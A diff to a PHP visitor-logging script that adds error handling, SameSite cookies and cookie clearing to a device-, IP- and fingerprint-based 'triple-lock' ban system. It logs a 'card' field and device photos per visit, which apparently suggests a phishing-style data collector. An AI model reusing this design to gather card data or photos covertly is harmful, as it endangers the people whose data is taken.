@@ -27,14 +27,19 @@ $stateFile = __DIR__ . '/latest_state.json';
 // Helper: load banned fingerprints
 function loadBannedFingerprints() {
     global $bannedFingerprintsFile;
-    $data = file_exists($bannedFingerprintsFile) ? json_decode(file_get_contents($bannedFingerprintsFile), true) : [];
+    if (!file_exists($bannedFingerprintsFile)) return [];
+    $content = @file_get_contents($bannedFingerprintsFile);
+    if ($content === false) return [];
+    $data = json_decode($content, true);
     return is_array($data) ? $data : [];
 }
 
 // Helper: save banned fingerprints
 function saveBannedFingerprints($fingerprints) {
     global $bannedFingerprintsFile;
-    @file_put_contents($bannedFingerprintsFile, json_encode($fingerprints, JSON_PRETTY_PRINT));
+    $json = json_encode($fingerprints, JSON_PRETTY_PRINT);
+    if ($json === false) return false;
+    return @file_put_contents($bannedFingerprintsFile, $json);
 }
 
 // Triple-Lock Check Function
@@ -143,41 +148,21 @@ function isBanned($deviceId, $ip, $fingerprint = null) {
     $locks = checkTripleLock($deviceId, $ip, $fingerprint);
     if (!empty($locks)) {
         // If any lock matches, ban
-        if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
-            $bannedDevices = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if ($deviceId !== 'unknown' && $deviceId !== '') {
+            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
             $bannedDevices = array_map('trim', $bannedDevices);
             if (!in_array($deviceId, $bannedDevices, true)) {
                 @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
             }
         }
-        // Set cookie
-        if (!isset($_COOKIE['banned']) || $_COOKIE['banned'] !== '1') {
-            setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
-        }
+        // Set/Refresh cookie
+        setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/; SameSite=Lax");
         return true;
     }
 
-    // Fallback: direct deviceId check
-    if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
-        $banned = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $banned = array_map('trim', $banned);
-        if (in_array($deviceId, $banned, true)) {
-            if (!isset($_COOKIE['banned'])) {
-                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
-            }
-            return true;
-        }
-    }
-
-    if ($ip !== 'unknown' && $ip !== '' && file_exists($bannedIpsFile)) {
-        $banned = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $banned = array_map('trim', $banned);
-        if (in_array($ip, $banned, true)) {
-            if (!isset($_COOKIE['banned'])) {
-                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
-            }
-            return true;
-        }
+    // If NOT matched by any lock but has cookie, clear it (User was likely unbanned)
+    if (isset($_COOKIE['banned'])) {
+        setcookie('banned', '', time() - 3600, "/; SameSite=Lax");
     }
 
     return false;
@@ -254,7 +239,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
     } else {
         // If not banned, but has banned cookie, clear it (Unban action)
         if (isset($_COOKIE['banned'])) {
-            setcookie('banned', '', time() - 3600, "/");
+            setcookie('banned', '', time() - 3600, "/; SameSite=Lax");
         }
     }
     http_response_code(200);
@@ -304,11 +289,18 @@ $photo_path = '—';
 $has_photo = false;
 if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
     $photosDir = __DIR__ . '/photos';
-    if (!is_dir($photosDir)) @mkdir($photosDir, 0777, true);
+    if (!is_dir($photosDir)) {
+        if (!@mkdir($photosDir, 0777, true)) {
+            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not create photos directory\n", FILE_APPEND);
+        }
+    }
     if (is_dir($photosDir)) {
         $photo_path = $photosDir . '/' . $deviceId . '.txt';
-        @file_put_contents($photo_path, $data['photo']);
-        $has_photo = true;
+        if (@file_put_contents($photo_path, $data['photo']) === false) {
+            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write photo for $deviceId\n", FILE_APPEND);
+        } else {
+            $has_photo = true;
+        }
     }
 }
 
@@ -384,7 +376,7 @@ if ($deviceId !== 'unknown') {
                     saveBannedFingerprints($bannedFps);
                 }
                 // Set cookie for auto-ban too
-                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/; SameSite=Lax");
             }
 
             // Cross-device canvas auto-ban: if the same canvasHash appears across 3+ devices
@@ -430,7 +422,9 @@ if ($deviceId !== 'unknown') {
             $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
         }
 
-        @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
+        if (@file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT)) === false) {
+            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write stateFile: $stateFile\n", FILE_APPEND);
+        }
     }
 
 // 2. Append to Visits History
@@ -448,7 +442,9 @@ $visitEntry = [
     'card' => $card,
     'has_photo' => $has_photo
 ];
-@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
+if (@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND) === false) {
+    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write to visitsLog: $visitsLog\n", FILE_APPEND);
+}
 
 header('Content-Type: application/json');
 echo json_encode(["status" => "ok", "logged" => true]);
